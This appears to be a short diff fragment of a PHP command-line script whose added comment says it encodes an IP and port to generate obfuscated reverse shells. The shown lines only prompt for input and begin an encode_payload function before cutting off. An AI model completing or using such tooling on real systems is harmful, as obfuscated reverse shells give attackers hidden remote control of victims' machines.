@@ -1,4 +1,5 @@
 <?php
+// The Script for encode a IP and PORT is used for generate obfuscated reverse shell
 echo "Enter a IP or a PORT. :  ";
 $iporport = fgets(STDIN);
 function encode_payload($payload) {
